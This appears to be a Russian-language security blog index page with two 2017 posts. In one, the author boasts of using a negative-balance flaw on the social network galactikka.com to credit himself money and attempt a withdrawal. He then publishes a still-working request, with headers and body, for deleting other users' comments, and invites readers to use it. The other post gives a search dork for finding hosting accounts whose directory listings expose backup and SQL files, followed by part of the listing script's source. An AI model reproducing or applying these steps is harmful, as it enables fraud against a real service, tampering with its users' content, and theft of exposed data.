
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>Security Idiot</title>
  <meta name="author" content="foozzi">

  
  <meta name="description" content="Есть некая соц. сеть galactikka.com, которая работает довольно давно, а так же имеет
ряд уязвимостей, за которые разработчикам должно быть стыдно :) &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://foozzi.github.io/">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="Security Idiot" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  

</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">Security Idiot</a></h1>
  
    <h2>pic.php%00png</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="sitesearch" value="foozzi.github.io">
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div class="blog-index">
  
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2017/07/02/galaktika-baghov/">Галактика багов</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2017-07-02T14:18:41+00:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>2</span><span class='date-suffix'>nd</span>, <span class='date-year'>2017</span></span> <span class='time'>2:18 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Есть некая соц. сеть <strong>galactikka.com</strong>, которая работает довольно давно, а так же имеет
ряд уязвимостей, за которые разработчикам должно быть стыдно :)</p>

<p>Решил за них выполнить работу, естественно бесплатно, так как данный сервис отказался
выплатить хоть какое либо вознаграждение, даже грубить стали ;)
<img src="https://i.imgur.com/mNZmZNil.png" alt="enter image description here" /></p>

<p>Я понимаю, сервис копейки приносит, не будем бедных грабить.</p>

<p>Первое что я нашел после 15 минут пребывания на данном сервисе, это тот факт, что при
отправке ajax запроса на просмотр баланса (при переходе на страницу вывода, осуществляается
данный запрос), можно было поставить сумму например <strong>-100000</strong> и получить <strong>100000</strong> р. на
сервисе, соотсветсвенно я купил парочку ненужных премиум аккаунтов, что бы удостовериться в
том, что деньги реально есть на счету, а так же поставил на вывод, если не ошибаюсь <strong>500</strong>
р. на <strong>wmr</strong> кошелек, после 3х суток ожидания денег, решил написать, что якобы я вывел
деньги, но они не дошли и в чем собственно дело, на что получить ответ - &ldquo;<strong>ждите</strong>&rdquo;, а еще
после суток пришел ответ, что я негодяй и воспользовался дырок, что бы заполучить 500 р. xD</p>

<p>Признавать тот факт что кодеров нужно уволить - отказались. Написал им так же что есть еще
ряд дыр, которые я могу слить за отдельное финансирование, но как я уже писал выше, ответ
был категоричен :)</p>

<h2>Нет проверки овнера комментария при удалении</h2>

<p>И так, первая дыра (<strong>на 02.07.2017 актуальна</strong>). Например у нас есть пост оф. команды
проекта
<img src="https://i.imgur.com/PvgFULZl.png" alt="enter image description here" /></p>

<p>Для начала узнаем <strong>id</strong> комментария:
<img src="https://imgur.com/diaKNozl.png" alt="enter image description here" /></p>

<p>Получили: <strong>59578449bd047002458b456d</strong></p>

<p>Теперь все, что осталось сделать, это отправить <strong>xhr</strong> на удаление комментария:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>POST https://galactikka.com/post/delete-comment</span></code></pre></td></tr></table></div></figure>


<p>с хедерами:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Host: galactikka.com
</span><span class='line'>User-Agent: {крутой ua}
</span><span class='line'>Accept: application/json, text/plain, */*
</span><span class='line'>Accept-Language: en-US,en;q=0.5
</span><span class='line'>Accept-Encoding: gzip, deflate, br
</span><span class='line'>Content-Type: application/x-www-form-urlencoded; charset=UTF-8
</span><span class='line'>X-Requested-With: XMLHttpRequest
</span><span class='line'>Referer: https://galactikka.com/news-59576cc5bd0470030d8b4567
</span><span class='line'>Content-Length: 68
</span><span class='line'>Cookie: PHPSESSID={сессия}; localTimezoneOffset=0
</span><span class='line'>Connection: keep-alive</span></code></pre></td></tr></table></div></figure>


<p>и телом:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>post_id=59576cc5bd0470030d8b4567&comment_id=5958fa73bd0470957e8b456a</span></code></pre></td></tr></table></div></figure>


<p>Где <strong>comment_id</strong> полученый id.</p>

<p>В ответ придет json с содержимым:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>error    "0"</span></code></pre></td></tr></table></div></figure>


<p>Чужой коммент удален ;)</p>

<h2>Многочисленный sql-error</h2>

<p>Существуют многочисленные потенциально опасные sql ошибки, которые, на удивление даже
обрабатываются эксепшенами.</p>

<p>Работайте.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2017/07/01/iskhodnyi-kod-default-dot-php-v-hostinger-podobnykh-khostinghakh/">Исходный код default.php в Hostinger-подобных хостингах</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2017-07-01T08:45:03+00:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>1</span><span class='date-suffix'>st</span>, <span class='date-year'>2017</span></span> <span class='time'>8:45 am</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><h2>Предыстория</h2>

<p>Когда то наткнулся на пост кробера о листинге файлов через default.php
(<a href="http://krober.biz/?p=2451">http://krober.biz/?p=2451</a>) и недавно понял, что подобных хостингов которые используют
стандарный файл для листинга довольно много и так же, довольно много тех, кто их не удаляет
из корня, так вот я проверил тот же <strong>000webhost</strong> и <strong>dreamhost</strong>, результатов конечно,
меньше чем <strong>hostinger</strong>, но это не мешает вам проверить остальные тысячи хостингов ;)</p>

<p><strong>Например:</strong></p>

<ul>
<li>inurl:default.php intext:&ldquo;000webhost&rdquo;+&ldquo;backup&rdquo; - выдаст сайты этого хостинга с листингом
и имеющим директорию <strong>backup</strong>, либо заменить на <strong>sql</strong>, либо вообще что угодно :)</li>
</ul>


<p>Нашел и решил опубликовать исходник самого <strong>default.php</strong>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
<span class='line-number'>165</span>
<span class='line-number'>166</span>
<span class='line-number'>167</span>
<span class='line-number'>168</span>
<span class='line-number'>169</span>
<span class='line-number'>170</span>
<span class='line-number'>171</span>
<span class='line-number'>172</span>
<span class='line-number'>173</span>
<span class='line-number'>174</span>
<span class='line-number'>175</span>
<span class='line-number'>176</span>
<span class='line-number'>177</span>
<span class='line-number'>178</span>
<span class='line-number'>179</span>
<span class='line-number'>180</span>
<span class='line-number'>181</span>
<span class='line-number'>182</span>
<span class='line-number'>183</span>
<span class='line-number'>184</span>
<span class='line-number'>185</span>
<span class='line-number'>186</span>
<span class='line-number'>187</span>
<span class='line-number'>188</span>
<span class='line-number'>189</span>
<span class='line-number'>190</span>
<span class='line-number'>191</span>
<span class='line-number'>192</span>
<span class='line-number'>193</span>
<span class='line-number'>194</span>
<span class='line-number'>195</span>
<span class='line-number'>196</span>
<span class='line-number'>197</span>
<span class='line-number'>198</span>
<span class='line-number'>199</span>
<span class='line-number'>200</span>
<span class='line-number'>201</span>
<span class='line-number'>202</span>
<span class='line-number'>203</span>
<span class='line-number'>204</span>
<span class='line-number'>205</span>
<span class='line-number'>206</span>
<span class='line-number'>207</span>
<span class='line-number'>208</span>
<span class='line-number'>209</span>
<span class='line-number'>210</span>
<span class='line-number'>211</span>
<span class='line-number'>212</span>
<span class='line-number'>213</span>
<span class='line-number'>214</span>
<span class='line-number'>215</span>
<span class='line-number'>216</span>
<span class='line-number'>217</span>
<span class='line-number'>218</span>
<span class='line-number'>219</span>
<span class='line-number'>220</span>
<span class='line-number'>221</span>
<span class='line-number'>222</span>
<span class='line-number'>223</span>
<span class='line-number'>224</span>
<span class='line-number'>225</span>
<span class='line-number'>226</span>
<span class='line-number'>227</span>
<span class='line-number'>228</span>
<span class='line-number'>229</span>
<span class='line-number'>230</span>
<span class='line-number'>231</span>
<span class='line-number'>232</span>
<span class='line-number'>233</span>
<span class='line-number'>234</span>
<span class='line-number'>235</span>
<span class='line-number'>236</span>
<span class='line-number'>237</span>
<span class='line-number'>238</span>
<span class='line-number'>239</span>
<span class='line-number'>240</span>
<span class='line-number'>241</span>
<span class='line-number'>242</span>
<span class='line-number'>243</span>
<span class='line-number'>244</span>
<span class='line-number'>245</span>
<span class='line-number'>246</span>
<span class='line-number'>247</span>
<span class='line-number'>248</span>
<span class='line-number'>249</span>
<span class='line-number'>250</span>
<span class='line-number'>251</span>
<span class='line-number'>252</span>
<span class='line-number'>253</span>
<span class='line-number'>254</span>
<span class='line-number'>255</span>
<span class='line-number'>256</span>
<span class='line-number'>257</span>
<span class='line-number'>258</span>
<span class='line-number'>259</span>
<span class='line-number'>260</span>
<span class='line-number'>261</span>
<span class='line-number'>262</span>
<span class='line-number'>263</span>
<span class='line-number'>264</span>
<span class='line-number'>265</span>
<span class='line-number'>266</span>
<span class='line-number'>267</span>
<span class='line-number'>268</span>
<span class='line-number'>269</span>
<span class='line-number'>270</span>
<span class='line-number'>271</span>
<span class='line-number'>272</span>
<span class='line-number'>273</span>
<span class='line-number'>274</span>
<span class='line-number'>275</span>
<span class='line-number'>276</span>
<span class='line-number'>277</span>
<span class='line-number'>278</span>
<span class='line-number'>279</span>
<span class='line-number'>280</span>
<span class='line-number'>281</span>
<span class='line-number'>282</span>
<span class='line-number'>283</span>
<span class='line-number'>284</span>
<span class='line-number'>285</span>
<span class='line-number'>286</span>
<span class='line-number'>287</span>
<span class='line-number'>288</span>
<span class='line-number'>289</span>
<span class='line-number'>290</span>
<span class='line-number'>291</span>
<span class='line-number'>292</span>
<span class='line-number'>293</span>
<span class='line-number'>294</span>
<span class='line-number'>295</span>
<span class='line-number'>296</span>
<span class='line-number'>297</span>
<span class='line-number'>298</span>
<span class='line-number'>299</span>
<span class='line-number'>300</span>
<span class='line-number'>301</span>
<span class='line-number'>302</span>
<span class='line-number'>303</span>
<span class='line-number'>304</span>
<span class='line-number'>305</span>
<span class='line-number'>306</span>
<span class='line-number'>307</span>
<span class='line-number'>308</span>
<span class='line-number'>309</span>
<span class='line-number'>310</span>
<span class='line-number'>311</span>
<span class='line-number'>312</span>
<span class='line-number'>313</span>
<span class='line-number'>314</span>
<span class='line-number'>315</span>
<span class='line-number'>316</span>
<span class='line-number'>317</span>
<span class='line-number'>318</span>
<span class='line-number'>319</span>
<span class='line-number'>320</span>
<span class='line-number'>321</span>
<span class='line-number'>322</span>
<span class='line-number'>323</span>
<span class='line-number'>324</span>
<span class='line-number'>325</span>
<span class='line-number'>326</span>
<span class='line-number'>327</span>
<span class='line-number'>328</span>
<span class='line-number'>329</span>
<span class='line-number'>330</span>
<span class='line-number'>331</span>
<span class='line-number'>332</span>
<span class='line-number'>333</span>
<span class='line-number'>334</span>
<span class='line-number'>335</span>
<span class='line-number'>336</span>
<span class='line-number'>337</span>
<span class='line-number'>338</span>
<span class='line-number'>339</span>
<span class='line-number'>340</span>
<span class='line-number'>341</span>
<span class='line-number'>342</span>
<span class='line-number'>343</span>
<span class='line-number'>344</span>
<span class='line-number'>345</span>
<span class='line-number'>346</span>
<span class='line-number'>347</span>
<span class='line-number'>348</span>
<span class='line-number'>349</span>
<span class='line-number'>350</span>
<span class='line-number'>351</span>
<span class='line-number'>352</span>
<span class='line-number'>353</span>
<span class='line-number'>354</span>
<span class='line-number'>355</span>
<span class='line-number'>356</span>
<span class='line-number'>357</span>
<span class='line-number'>358</span>
<span class='line-number'>359</span>
<span class='line-number'>360</span>
<span class='line-number'>361</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span>
</span><span class='line'>
</span><span class='line'><span class="nb">header</span><span class="p">(</span><span class="s1">&#39;Content-Type: text/html; charset=utf-8&#39;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$host</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'><span class="nb">setlocale</span><span class="p">(</span><span class="nx">LC_TIME</span><span class="p">,</span> <span class="s2">&quot;in_IN.utf8&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="nb">date_default_timezone_set</span><span class="p">(</span><span class="s1">&#39;Asia/Kolkata&#39;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="cm">/*</span>
</span><span class='line'>
</span><span class='line'><span class="cm">Directory Listing Script - Version 2</span>
</span><span class='line'>
</span><span class='line'><span class="cm">====================================</span>
</span><span class='line'>
</span><span class='line'><span class="cm">Script Author: Ash Young &lt;ash@evoluted.net&gt;. www.evoluted.net</span>
</span><span class='line'>
</span><span class='line'><span class="cm">Layout: Manny &lt;manny@tenka.co.uk&gt;. www.tenka.co.uk</span>
</span><span class='line'>
</span><span class='line'><span class="cm">*/</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$startdir</span> <span class="o">=</span> <span class="s1">&#39;.&#39;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$showthumbnails</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$showdirs</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$forcedownloads</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$hide</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
</span><span class='line'>
</span><span class='line'>              <span class="s1">&#39;dlf&#39;</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>              <span class="s1">&#39;public_html&#39;</span><span class="p">,</span>               
</span><span class='line'>
</span><span class='line'>              <span class="s1">&#39;index.php&#39;</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>              <span class="s1">&#39;Thumbs&#39;</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>              <span class="s1">&#39;.htaccess&#39;</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>              <span class="s1">&#39;.htpasswd&#39;</span>
</span><span class='line'>
</span><span class='line'>          <span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$displayindex</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$allowuploads</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$overwrite</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="nv">$indexfiles</span> <span class="o">=</span> <span class="k">array</span> <span class="p">(</span>
</span><span class='line'>
</span><span class='line'>              <span class="s1">&#39;index.html&#39;</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>              <span class="s1">&#39;index.htm&#39;</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>              <span class="s1">&#39;default.htm&#39;</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>              <span class="s1">&#39;default.html&#39;</span>
</span><span class='line'>
</span><span class='line'>          <span class="p">);</span>
</span><span class='line'>
</span><span class='line'>          
</span><span class='line'>
</span><span class='line'><span class="nv">$filetypes</span> <span class="o">=</span> <span class="k">array</span> <span class="p">(</span>
</span><span class='line'>
</span><span class='line'>              <span class="s1">&#39;png&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;jpg.gif&#39;</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>              <span class="s1">&#39;jpeg&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;jpg.gif&#39;</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>              <span class="s1">&#39;bmp&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;jpg.gif&#39;</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>              <span class="s1">&#39;jpg&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;jpg.gif&#39;</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>              <span class="s1">&#39;gif&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;gif.gif&#39;</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>              <span class="s1">&#39;zip&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;archive.png&#39;</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>              <span class="s1">&#39;rar&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;archive.png&#39;</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>              <span class="s1">&#39;exe&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;exe.gif&#39;</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>              <span class="s1">&#39;setup&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;setup.gif&#39;</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>              <span class="s1">&#39;txt&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;text.png&#39;</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>              <span class="s1">&#39;htm&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;html.gif&#39;</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>              <span class="s1">&#39;html&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;html.gif&#39;</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>              <span class="s1">&#39;php&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;php.gif&#39;</span><span class="p">,</span>                
</span><span class='line'>
</span><span class='line'>              <span class="s1">&#39;fla&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;fla.gif&#39;</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>              <span class="s1">&#39;swf&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;swf.gif&#39;</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>              <span class="s1">&#39;xls&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;xls.gif&#39;</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>              <span class="s1">&#39;doc&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;doc.gif&#39;</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>              <span class="s1">&#39;sig&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;sig.gif&#39;</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>              <span class="s1">&#39;fh10&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;fh10.gif&#39;</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>              <span class="s1">&#39;pdf&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;pdf.gif&#39;</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>              <span class="s1">&#39;psd&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;psd.gif&#39;</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>              <span class="s1">&#39;rm&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;real.gif&#39;</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>              <span class="s1">&#39;mpg&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;video.gif&#39;</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>              <span class="s1">&#39;mpeg&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;video.gif&#39;</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>              <span class="s1">&#39;mov&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;video2.gif&#39;</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>              <span class="s1">&#39;avi&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;video.gif&#39;</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>              <span class="s1">&#39;eps&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;eps.gif&#39;</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>              <span class="s1">&#39;gz&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;archive.png&#39;</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>              <span class="s1">&#39;asc&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;sig.gif&#39;</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>          <span class="p">);</span>
</span><span class='line'>
</span><span class='line'>          
</span><span class='line'>
</span><span class='line'><span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;imagecreatetruecolor&#39;</span><span class="p">))</span> <span class="nv">$showthumbnails</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$leadon</span> <span class="o">=</span> <span class="nv">$startdir</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nv">$leadon</span><span class="o">==</span><span class="s1">&#39;.&#39;</span><span class="p">)</span> <span class="nv">$leadon</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">((</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$leadon</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span><span class="o">!=</span><span class="s1">&#39;/&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$leadon</span><span class="o">!=</span><span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="nv">$leadon</span> <span class="o">=</span> <span class="nv">$leadon</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$startdir</span> <span class="o">=</span> <span class="nv">$leadon</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;dir&#39;</span><span class="p">])</span> <span class="p">{</span>
</span><span class='line'>
</span><span class='line'>  <span class="c1">// check this is okay.</span>
</span><span class='line'>
</span><span class='line'>  
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;dir&#39;</span><span class="p">],</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span><span class="o">!=</span><span class="s1">&#39;/&#39;</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>
